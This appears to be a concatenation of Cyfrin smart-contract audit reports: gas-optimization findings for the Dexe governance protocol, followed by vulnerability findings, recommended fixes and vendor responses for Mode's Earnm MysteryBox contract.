215:         for (uint256 i = offset; i < to; i++) {

215:         for (uint256 i = offset; i < to; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

69:         for (uint256 i; i < actionsOnFor.length; i++) {

69:         for (uint256 i; i < actionsOnFor.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

27:         for (uint256 i = 0; i < length; i++) {

27:         for (uint256 i = 0; i < length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

```


```solidity
File: libs/gov/gov-pool/GovPoolExecute.sol

60:         for (uint256 i; i < actionsLength; i++) {

60:         for (uint256 i; i < actionsLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

100:         for (uint256 i; i < proposalIds.length; i++) {

100:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

135:             for (uint256 i = length; i > 0; i--) {

135:             for (uint256 i = length; i > 0; i--) {

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolUnlock.sol

27:         for (uint256 i; i < proposalIds.length; i++) {

27:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolView.sol

60:         for (uint256 i = offset; i < to; i++) {

60:         for (uint256 i = offset; i < to; i++) {

147:         for (uint256 i; i < unlockedIds.length; i++) {

147:         for (uint256 i; i < unlockedIds.length; i++) {

168:         for (uint256 i; i < proposalsLength; i++) {

168:         for (uint256 i; i < proposalsLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

165:         for (uint256 i; i < delegationsInfo.length; i++) {

165:         for (uint256 i; i < delegationsInfo.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

201:         for (uint256 i; i < nftsLength; i++) {

201:         for (uint256 i; i < nftsLength; i++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsCreate.sol

141:         for (uint256 i = 0; i < tokensLength; i++) {

141:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

42:         for (uint256 i = 0; i < length; i++) {

42:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

251:         for (uint256 i = 0; i < length; i++) {

251:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

93:         for (uint256 i = offset; i < to; i++) {

93:         for (uint256 i = offset; i < to; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

79:         for (uint256 i = 0; i < length; i++) {

79:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```


**Recommended Mitigation:** Use unchecked block to increment loop counter when overflow impossible or upgrade to Solidity 0.8.22.

Before:
```solidity
for (uint256 i = 0; i < params.users.length; i++) {
```

After:
```solidity
uint256 loopLength = params.users.length;
for (uint256 i; i < loopLength;) {
    // logic goes here


    // increment loop at the end
    unchecked {++i;}
}
```

**Dexe:**
Acknowledged. We do not consider optimizations of 2-3 wei as a huge benefit. Code readability is a priority in this case.


### Don't initialize variables with default value

**Description:** Don't initialize variables with default value.

**Impact:** Gas optimization.

**Proof of Concept:**
```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

461:         for (uint256 i = 0; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

27:         for (uint256 i = 0; i < length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsCreate.sol

141:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

42:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

251:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/math/LogExpMath.sol

350:         int256 sum = 0;

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

79:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```

```solidity
File: mock/gov/PolynomTesterMock.sol

58:         for (uint256 i = 0; i < users.length; i++) {

```

From Solarity library:

```solidity
File: access-control/RBAC.sol

103:         for (uint256 i = 0; i < permissionsToAdd_.length; i++) {

124:         for (uint256 i = 0; i < permissionsToRemove_.length; i++) {

173:         for (uint256 i = 0; i < allowed_.length; i++) {

178:         for (uint256 i = 0; i < disallowed_.length; i++) {

200:         for (uint256 i = 0; i < roles_.length; i++) {

```

```solidity
File: access-control/extensions/RBACGroupable.sol

116:         for (uint256 i = 0; i < userGroupsLength_; ++i) {

157:         for (uint256 i = 0; i < roles_.length; i++) {

169:         for (uint256 i = 0; i < groups_.length; i++) {

172:             for (uint256 j = 0; j < roles_.length; j++) {

```

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

125:         for (uint256 i = 0; i < names_.length; i++) {

```

```solidity
File: diamond/Diamond.sol

110:         for (uint256 i = 0; i < selectors_.length; i++) {

134:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: diamond/DiamondStorage.sol

55:         for (uint256 i = 0; i < facets_.length; i++) {

75:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: libs/arrays/ArrayHelper.sol

160:         for (uint256 i = 0; i < what_.length; i++) {

172:         for (uint256 i = 0; i < what_.length; i++) {

184:         for (uint256 i = 0; i < what_.length; i++) {

196:         for (uint256 i = 0; i < what_.length; i++) {

```

```solidity
File: libs/arrays/SetHelper.sol

22:         for (uint256 i = 0; i < array_.length; i++) {

28:         for (uint256 i = 0; i < array_.length; i++) {

34:         for (uint256 i = 0; i < array_.length; i++) {

45:         for (uint256 i = 0; i < array_.length; i++) {

51:         for (uint256 i = 0; i < array_.length; i++) {

57:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: libs/data-structures/memory/Vector.sol

287:         for (uint256 i = 0; i < length_; ++i) {

```

```solidity
File: mock/libs/arrays/PaginatorMock.sol

46:         for (uint256 i = 0; i < length_; i++) {

```

```solidity
File: mock/libs/data-structures/StringSetMock.sol

38:         for (uint256 i = 0; i < set_.length; i++) {

```

```solidity
File: mock/libs/data-structures/memory/VectorMock.sol

42:         for (uint256 i = 0; i < vector2_.length(); i++) {

70:         for (uint256 i = 0; i < vector_.length(); i++) {

89:         for (uint256 i = 0; i < 10; i++) {

100:         for (uint256 i = 0; i < array_.length; i++) {

123:         for (uint256 i = 0; i < 50; i++) {

```

```solidity
File: mock/libs/zkp/snarkjs/VerifierMock.sol

34:         for (uint256 i = 0; i < inputs_.length; i++) {

54:         for (uint256 i = 0; i < inputs_.length; i++) {

```

```solidity
File: oracles/UniswapV2Oracle.sol

65:         for (uint256 i = 0; i < pairsLength_; i++) {

103:         for (uint256 i = 0; i < pathLength_ - 1; i++) {

178:         for (uint256 i = 0; i < numberOfPaths_; i++) {

187:             for (uint256 j = 0; j < pathLength_ - 1; j++) {

208:         for (uint256 i = 0; i < numberOfPaths_; i++) {

216:             for (uint256 j = 0; j < pathLength_ - 1; j++) {

```


**Recommended Mitigation:** Don't initialize variables with default value.

**Dexe:**
Acknowledged; we do not consider optimizations of 2-3 wei as a huge benefit. Code readability is a priority in this case. Wherever optimizations made sense, we optimized the code.


### Functions not used internally could be marked external

**Description:** Functions not used internally could be marked `external`. In general `external` functions have a lesser gas overhead than `public` functions.

**Proof of Concept:**
```solidity
File: factory/PoolFactory.sol

53:     function setDependencies(address contractsRegistry, bytes memory data) public override {

```

```solidity
File: factory/PoolRegistry.sol

43:     function setDependencies(address contractsRegistry, bytes memory data) public override {

```

```solidity
File: gov/ERC721/multipliers/AbstractERC721Multiplier.sol

29:     function __ERC721Multiplier_init(

77:     function supportsInterface(

```

```solidity
File: gov/GovPool.sol

132:     function setDependencies(address contractsRegistry, bytes memory) public override dependant {

141:     function unlock(address user) public override onlyBABTHolder {

145:     function execute(uint256 proposalId) public override onlyBABTHolder {

373:     function getProposalState(uint256 proposalId) public view override returns (ProposalState) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

234:     function uri(uint256 tierId) public view override returns (string memory) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

665:     function nftVotingPower(

```

```solidity
File: user/UserRegistry.sol

19:     function __UserRegistry_init(string calldata name) public initializer {

67:     function userInfos(address user) public view returns (UserInfo memory) {

```

**Recommended Mitigation:** Consider marking above functions `external`.

**Dexe:**
Fixed in commit [b417eaf](https://github.com/dexe-network/DeXe-Protocol/commit/b417eafe501100b8c36ec92494798bbd73add796).

**Cyfrin:** Verified.


### Using bools for storage incurs overhead

**Description:** Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from false to true, after having been true in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

**Impact:** Gas optimization

**Proof of Concept:**
```solidity
File: factory/PoolFactory.sol

41:     mapping(bytes32 => bool) private _usedSalts;

```

```solidity
File: gov/GovPool.sol

76:     bool public onlyBABTHolders;

```

```solidity
File: gov/validators/GovValidators.sol

35:     mapping(uint256 => mapping(bool => mapping(address => mapping(bool => uint256))))

```

```solidity
File: interfaces/gov/IGovPool.sol

197:         mapping(uint256 => bool) isClaimed;

207:         mapping(uint256 => bool) areVotingRewardsSet;

287:         mapping(bytes32 => bool) usedHashes;

```

```solidity
File: interfaces/gov/proposals/IDistributionProposal.sol

16:         mapping(address => bool) claimed;

```

From Solarity library:

```solidity
File: access-control/RBAC.sol

42:     mapping(string => mapping(bool => mapping(string => StringSet.Set))) private _rolePermissions;

43:     mapping(string => mapping(bool => StringSet.Set)) private _roleResources;

```

```solidity
File: compound-rate-keeper/AbstractCompoundRateKeeper.sol

31:     bool private _isMaxRateReached;

```

```solidity
File: contracts-registry/AbstractContractsRegistry.sol

42:     mapping(address => bool) private _isProxy;

```

```solidity
File: diamond/tokens/ERC721/DiamondERC721Storage.sol

36:         mapping(address => mapping(address => bool)) operatorApprovals;

```

**Recommended Mitigation:** Consider replacing `bool` with `uint256`

**Dexe:**
Acknowledged; we do not consider optimizations of 2-3 wei as a huge benefit. Code readability is a priority in this case. Wherever optimizations made sense, we optimized the code.

\clearpage

------ FILE END car/reports_md/2023-11-10-cyfrin-dexe.md ------


------ FILE START car/reports_md/2023-11-20-cyfrin-mode-earnm.md ------

**Lead Auditors**

[Dacian](https://twitter.com/devdacian)

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**

 


---

# Findings
## Critical Risk


### Polygon chain reorgs will change mystery box tiers which can be gamed by validators

**Description:** [`REQUEST_CONFIRMATIONS = 3`](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L26) is too small for polygon, as [chain re-orgs frequently have block-depth greater than 3](https://polygonscan.com/blocks_forked?p=1).

**Impact:** Chain re-orgs re-order blocks and transactions changing randomness results. Someone who originally won a rare box could have that result changed into a common box and vice versa due to changing randomness result during the re-org.

This can also be [exploited by validators](https://docs.chain.link/vrf/v2/security/#choose-a-safe-block-confirmation-time-which-will-vary-between-blockchains) who can intentionally rewrite the chain's history to force a randomness request into a different block, changing the randomness result. This allows validators to get a fresh random value which may be to their advantage if they are minting mystery boxes by moving the txn around to get a better randomness result to mint a rarer box.

**Recommended Mitigation:** `REQUEST_CONFIRMATIONS = 30` appears very safe for polygon as it is very rare for chain re-orgs to have block-depth greater than this. If this happens occasionally it isn't a big deal, but if it happens all the time ("3" ensures this) that is not good and potentially exploitable by validators.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Transferring mystery boxes bricks token redemption

**Description:** `MysteryBox` is an `ERC1155` contract which users expect to be able to transfer to other addresses via the in-built transfer functions. But `MysteryBox::claimMysteryBoxes()` [reverts](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L296) unless the caller is the same address who minted the box since the internal mappings that track mystery box ownership are never updated when transfers occur.

**Impact:** Token redemption is bricked if users transfer their mystery box. Users reasonably expect to be able to transfer their mystery box from one address they control to another address (if for example their first address is compromised), or they may wish to sell their mystery box on platforms like OpenSea which support `ERC1155` sales.

**Recommended Mitigation:** Override `ERC1155` transfer hooks to either prevent transferring of mystery boxes, or to update the internal mappings such that when mystery boxes are transferred the new owner address can redeem their tokens. The second option may be more attractive for the protocol as it allows mystery box holders to access liquidity without putting sell pressure on the token, creating a "secondary market" for mystery boxes.

**Mode:**
Fixed in commit [a65a50c](https://github.com/Earnft/smart-contracts/commit/a65a50ca8af4d6abc58d3c429785bcd82182c04e) by overriding `ERC1155::_beforeTokenTransfer()` to prevent mystery boxes from being transferred.

**Cyfrin:** Verified.

\clearpage
## High Risk


### Broken check in `MysteryBox::fulfillRandomWords()` fails to prevent same request being fulfilled multiple times

**Description:** Consider the [check](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L221-L222) which attempts to prevent the same request from being fulfilled multiple times:
```solidity
if (vrfRequests[_requestId].fulfilled) revert InvalidVrfState();
```

The problem is that `vrfRequests[_requestId].fulfilled` is never set to `true` anywhere and `vrfRequests[_requestId]` is [deleted](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L244-L245) at the end of the function.

**Impact:** The same request can be fulfilled multiple times which would override the previous randomly generated seed; a malicious provider who was also a mystery box minter could generate new randomness until they got a rare mystery box.

**Recommended Mitigation:** Set `vrfRequests[_requestId].fulfilled = true`.

Consider an optimized version which involves having 2 mappings `activeVrfRequests` and `fulfilledVrfRequests`:
* revert `if(fulfilledVrfRequests[_requestId])`
* else set `fulfilledVrfRequests[_requestId] = true`
* fetch the matching active request into memory from `activeVrfRequests[_requestId]` and continue processing as normal
* at the end `delete activeVrfRequests[_requestId]`

This only stores forever the `requestId` : `bool` pair in `fulfilledVrfRequests`.

Consider a similar approach in `MysteryBox::fulfillBoxAmount()`.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3), [c4c50ed](https://github.com/Earnft/smart-contracts/commit/c4c50edcd2a3f9fc2da4e1934bcfa1d3cbd85809), [d5b14d8](https://github.com/Earnft/smart-contracts/commit/d5b14d80dae0cc78ab63537d405c8c49a6238a57), [5df2b82](https://github.com/Earnft/smart-contracts/commit/5df2b824dba5b25a0d8db28fa10de4a4bc52ec3b).

**Cyfrin:** Verified.


### Owner can rug-pull redemption tokens leaving mystery box contract insolvent and mystery box holders unable to redeem

**Description:** [`MysteryBox::ownerWithdrawEarnm()`](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L765-L777) allows the owner to transfer the contract's total redemption token balance to themselves, rug-pulling the redemption tokens which mystery boxes are supposed to be redeemed for.

**Impact:** The contract becomes totally insolvent and mystery box owners are unable to redeem.

**Recommended Mitigation:** The contract should always have the necessary tokens to payout the maximum redemption liability on all currently minted and unclaimed mystery boxes. The owner should only be able to withdraw the surplus amount (the excess over the total liability).

When mystery boxes are minted the total liability increases and when mystery boxes are claimed the total liability decreases. Consider tracking the total liability as mystery boxes are minted & claimed and only allowing the owner to withdraw the surplus tokens above this value.

**Mode:**
Fixed in commit [db7b48e](https://github.com/Earnft/smart-contracts/commit/db7b48e69c33e327d613f88035c8335531572e8d), [edefb61](https://github.com/Earnft/smart-contracts/commit/edefb61534ecee1a2f6cb7e687c113a1f7b82056), [a65a50c](https://github.com/Earnft/smart-contracts/commit/a65a50ca8af4d6abc58d3c429785bcd82182c04e).

**Cyfrin:** Verified.


### Incorrect cap on `batchesAmount` results in 500M instead of 5B tokens distributed to mystery box holders

**Description:** `setBatchesAmount()` [caps](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L782) the maximum `batchesAmount` 100 but this is incorrect. Every batch releases mystery boxes which can be redeemed for ~5M tokens and there are 5B tokens in total so 1000 batches to distribute the entire supply.

**Impact:** Incorrectly capping to 100 batches results in never being able to distribute all 5B tokens, but only 500M tokens.

**Recommended Mitigation:** Cap `batchesAmount` to 1000 to allow full token distribution.

**Mode:**
Fixed in commit [ae3dc68](https://github.com/Earnft/smart-contracts/commit/ae3dc68db8c723293df01cb14297dc3264a21dbe).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Excess eth not refunded to user in `MysteryBox::revealMysteryBoxes()`

**Description:** `MysteryBox::revealMysteryBoxes()` [allows execution](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L196-L198) if `msg.value >= mintFee` but in the case where `msg.value > mintFee`, the extra eth gets sent to `operatorAddress` not refunded back to the user.

**Impact:** User loses excess eth above `mintFee`.

**Recommended Mitigation:** Either refund excess eth back to the user or revert if `msg.value != mintFee`.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Minting can be indefinitely stuck due to request timeout of external adapters when using Chainlink Any API

**Description:** Mode has integrated Chainlink Any API to interact with external adapters, verifying user codes and wallet addresses to determine the number of boxes to mint. The system uses a `direct-request` job type, triggering actions based on the `ChainlinkRequested` event emission. However, there's a notable issue: if the initial GET request times out, such requests may remain pending indefinitely. Current design does not have a provision to cancel pending requests and create new ones.

**Impact:** If the external adapter doesn't respond promptly, users are unable to submit another minting request because their code is deleted after the initial request. This could result in users losing their codes and not receiving their mystery box rewards.

**Recommended Mitigation:** Consider implementing a function that code recipients can invoke in the event of a request timeout. This function should internally call `ChainlinkClient:cancelChainlinkRequest` and include a callback to the `MysteryBox` contract to initiate a new request using the same data as the original. Essentially, this means reusing the code/user address and the previously generated random number for the new request.

**Mode:**
Acknowledged.


\clearpage
## Low Risk


### Use low level `call()` to prevent gas griefing attacks when returned data not required

**Description:** Using `call()` when the returned data is not required unnecessarily exposes to gas griefing attacks from huge returned data payload. For [example](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L197-L198):
```solidity
(bool sent, ) = address(operatorAddress).call{value: msg.value}("");
if (!sent) revert Unauthorized();
```
Is the same as writing:
```solidity
(bool sent, bytes memory data) = address(operatorAddress).call{value: msg.value}("");
if (!sent) revert Unauthorized();
```
In both cases the returned data will have to be copied into memory exposing the contract to gas griefing attacks, even though the returned data is not required at all.

**Impact:** Contracts unnecessarily expose themselves to gas griefing attacks.

**Recommended Mitigation:** Use a low-level call when the returned data is not required, eg:

```solidity
bool sent;
assembly {
    sent := call(gas(), receiver, amount, 0, 0, 0, 0)
}
if (!sent) revert Unauthorized();
```
Consider using [ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall).

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.

\clearpage
## Informational


### Prevent duplicate `boxId` inputs to `MysteryBox::claimMysteryBoxes()`

**Description:** Consider preventing duplicate `boxId` inputs to [`MysteryBox::claimMysteryBoxes()`](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L271) as this may be exploitable under certain circumstances.

**Impact:** Attackers could use duplicate inputs to exploit token claiming.

**Recommended Mitigation:** Revert if duplicate inputs occur; `boxId` is unique so duplicate inputs are an obvious sign of a malicious attack.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3), [3713107](https://github.com/Earnft/smart-contracts/commit/3713107bb24382bda0fb6ac2eb51e9c64c39c98d).

**Cyfrin:** Verified.


### `MysteryBox::claimMysteryBoxes()` should return custom error when reverting due to `amountToClaim == 0`

**Description:** `MysteryBox::claimMysteryBoxes()` should [return custom error](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L305) when reverting due to `amountToClaim == 0`. Currently it returns `InsufficientEarnmBalance` which is the same error as if the contract had insufficient token balance for the mystery box being redeemed.

**Impact:** Misleading error is returned.

**Recommended Mitigation:** Return a custom error.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Potential Risk of Price Volatility in EarnNM Token Due to Concentrated Mystery Box Rewards

**Description:** The current mechanism for distributing mystery box rewards in the system is based on randomness, which carries the risk of a large influx of tokens entering circulation within a short span. In particular, unusual situations might arise where a substantial number of high-value boxes (such as 1 mythical, 2 legendary, and 10 epic) are allocated over a brief period, like 1-2 days. Additionally, there's a possibility of minting a significant volume of boxes in a short duration. As a result, there's a possibility that all these boxes might release EarnM tokens simultaneously when their vesting period ends.

EarnM tokens are not fee-based tokens (e.g., token value linked to protocol fees) or any staking mechanisms to encourage token retention. In effect, there are no demand drivers and no supply dampeners in the current design.

**Impact:** Intense sell pressure, especially during a market downturn, may lead to price manipulation risks in liquidity pools. Such a significant price drop could incite panic among users, prompting them to redeem their mystery boxes notwithstanding the 50/90% haircut. This action could amplify the sell-off, potentially spiralling into a severe scenario akin to previous market collapses seen with tokens like Terra Luna.

**Recommended Mitigation:** Given the uncertainty surrounding the scale and reach of EarnM token liquidity pools, we recommend the team ensures sufficient liquidity to counterbalance potential sell pressure post-vesting. Proactive liquidity management could be crucial in stabilising token value during critical periods.

**Mode:**
Acknowledged.


### Centralisation risks as the reward code generator and the Chainlink node operator is the same entity

**Description:** The current system architecture for managing reward codes in MODE is centralized, with both code generation and Chainlink node operations controlled by the MODE team. The endpoint tracking and managing these codes is not public. Using Chainlink Any API under this setup adds limited value, as it's managed by a single node operator  the MODE team itself. This centralization undermines the potential benefits of a decentralized oracle network.

**Impact:** This setup leads to unnecessary complications and expenses, including LINK fees, without offering the decentralization benefits typically associated with Chainlink's infrastructure.

**Recommended Mitigation:** Two potential alternatives could be considered to address this issue:

1. **Engage an External Node Operator:** Delegate the reward code verification tasks to an external node operator. This approach would involve creating a function to call `Chainlink:setChainlinkOracle`, allowing future updates to the oracle. Making the endpoint public in the future would empower MODE to appoint new operators as needed.

